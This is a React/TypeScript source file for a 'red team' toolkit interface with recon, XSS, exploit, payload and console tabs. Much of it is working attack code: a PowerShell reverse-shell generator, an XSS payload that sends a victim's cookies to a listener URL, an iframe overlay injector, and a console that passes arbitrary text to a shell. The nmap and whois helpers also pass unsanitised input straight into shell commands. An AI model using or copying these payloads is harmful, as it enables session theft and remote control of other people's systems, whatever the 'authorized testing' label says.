import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { exec } from "child_process";
import { Bug, Eye, KeyRound, Terminal } from "lucide-react";

// --- MAIN UI ---
export default function RedTeamToolkit() {
  const [previewPayload, setPreviewPayload] = useState("");

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4">
      <Card className="rounded-2xl shadow-xl">
        <CardContent className="p-4">
          <Tabs defaultValue="recon">
            <TabsList className="flex w-full justify-around">
              <TabsTrigger value="recon"><Eye className="mr-2" /> Recon</TabsTrigger>
              <TabsTrigger value="exploit"><Bug className="mr-2" /> Exploit</TabsTrigger>
              <TabsTrigger value="payload"><KeyRound className="mr-2" /> Payloads</TabsTrigger>
              <TabsTrigger value="console"><Terminal className="mr-2" /> Console</TabsTrigger>
              <TabsTrigger value="xss"><Bug className="mr-2" /> XSS Toolkit</TabsTrigger>
            </TabsList>

            {/* === RECON TAB === */}
            <TabsContent value="recon">
              <p className="text-sm">Quick recon tools for target profiling:</p>
              <div className="mt-2 space-y-2">
                <Button
                  variant="secondary"
                  className="w-full"
                  onClick={async () => {
                    const target = prompt("Target IP/Host for Nmap:");
                    if (!target) return;
                    const result = await ReconModule.runNmapScan(target);
                    alert(result);
                  }}
                >
                  Run Nmap Scan
                </Button>
              </div>
            </TabsContent>

            {/* === XSS TAB === */}
            <TabsContent value="xss">
              <p className="text-sm">XSS payloads for testing and red team simulation:</p>
              <div className="mt-2 space-y-2">
                <Button variant="outline" className="w-full" onClick={() => {
                  const payload = XSSFactory.basicAlert("PWNED");
                  navigator.clipboard.writeText(payload);
                  setPreviewPayload(payload);
                  alert("Basic alert payload copied!");
                }}>
                  Copy Basic Alert Payload
                </Button>

                <Button variant="outline" className="w-full" onClick={() => {
                  const url = prompt("Exfil URL (listener)?");
                  if (!url) return;
                  const payload = XSSFactory.cookieStealer(url);
                  navigator.clipboard.writeText(payload);
                  setPreviewPayload(payload);
                  alert("Cookie stealer copied!");
                }}>
                  Copy Cookie Stealer
                </Button>

                <Button variant="outline" className="w-full" onClick={() => {
                  const src = prompt("Iframe URL?");
                  if (!src) return;
                  const payload = XSSFactory.iframeInjector(src);
                  navigator.clipboard.writeText(payload);
                  setPreviewPayload(payload);
                  alert("Iframe injector copied!");
                }}>
                  Copy Iframe Injector
                </Button>

                <Button variant="outline" className="w-full" onClick={() => {
                  const payload = XSSFactory.eventDriven();
                  navigator.clipboard.writeText(payload);
                  setPreviewPayload(payload);
                  alert("Event-driven XSS copied!");
                }}>
                  Copy OnError Event Trigger
                </Button>

                {previewPayload && (
                  <div className="mt-4">
                    <p className="text-xs text-muted-foreground mb-1">Live preview:</p>
                    <iframe
                      sandbox="allow-scripts"
                      srcDoc={previewPayload}
                      className="w-full h-48 border rounded-md"
                    />
                    <Button
                      variant="ghost"
                      className="text-red-500 mt-2 text-sm"
                      onClick={() => setPreviewPayload("")}
                    >
                      Clear Preview
                    </Button>
                  </div>
                )}
              </div>
            </TabsContent>

            {/* === EXPLOIT TAB === */}
            <TabsContent value="exploit">
              <p className="text-sm">Scripted exploit modules (for authorized testing only):</p>
              <div className="mt-2 space-y-2">
                <Button variant="destructive" className="w-full">Exploit SMBv1</Button>
                <Button variant="destructive" className="w-full">SQL Injection</Button>
                <Button variant="destructive" className="w-full">Cross-Site Scripting (XSS)</Button>
              </div>
            </TabsContent>

            {/* === PAYLOAD TAB === */}
            <TabsContent value="payload">
              <p className="text-sm">Payload generators (download, reverse shell, etc):</p>
              <div className="mt-2 space-y-2">
                <Button variant="outline" className="w-full">Generate PowerShell Payload</Button>
                <Button variant="outline" className="w-full">Build Bash One-liner</Button>
                <Button variant="outline" className="w-full">Generate .hta Loader</Button>
              </div>
            </TabsContent>

            {/* === CONSOLE TAB === */}
            <TabsContent value="console">
              <p className="text-sm">Command execution interface (bind shell / beacon req’d):</p>
              <textarea
                placeholder="Run remote commands..."
                className="w-full h-40 mt-2 p-2 bg-black text-green-400 font-mono text-sm rounded-md shadow-inner"
              ></textarea>
              <Button className="mt-2">Execute</Button>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}

// --- MODULES ---
export const ReconModule = {
  runNmapScan: (target: string) => {
    return new Promise((resolve, reject) => {
      exec(`nmap -sV ${target}`, (error, stdout) => {
        if (error) reject(error);
        resolve(stdout);
      });
    });
  },
  dnsLookup: async (domain: string) => {
    const response = await fetch(`https://dns.google/resolve?name=${domain}`);
    return response.json();
  },
  whoisLookup: (domain: string) => {
    return new Promise((resolve, reject) => {
      exec(`whois ${domain}`, (error, stdout) => {
        if (error) reject(error);
        resolve(stdout);
      });
    });
  }
};

export const ExploitModule = {
  sqlInjectionTest: async (target: string, payload: string) => {
    const response = await fetch(target, {
      method: 'POST',
      body: JSON.stringify({ query: payload }),
      headers: { 'Content-Type': 'application/json' }
    });
    return response.json();
  }
};

export const PayloadModule = {
  generatePowerShell: (ip: string, port: number) => {
    return `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
  }
};

export const ConsoleModule = {
  executeCommand: (command: string) => {
    return new Promise((resolve, reject) => {
      exec(command, (error, stdout, stderr) => {
        if (error) reject(error);
        resolve(stdout || stderr);
      });
    });
  }
};

export const XSSFactory = {
  basicAlert: (message = "XSS") => `<script>alert('${message}')</script>`,
  cookieStealer: (url: string) => `<script>fetch('${url}?c='+document.cookie)</script>`,
  iframeInjector: (src: string) => `<iframe src='${src}' style='position:absolute;width:100%;height:100%;top:0;left:0;z-index:9999;'></iframe>`,
  eventDriven: () => `<img src="x" onerror="alert('XSS triggered!')" />`
};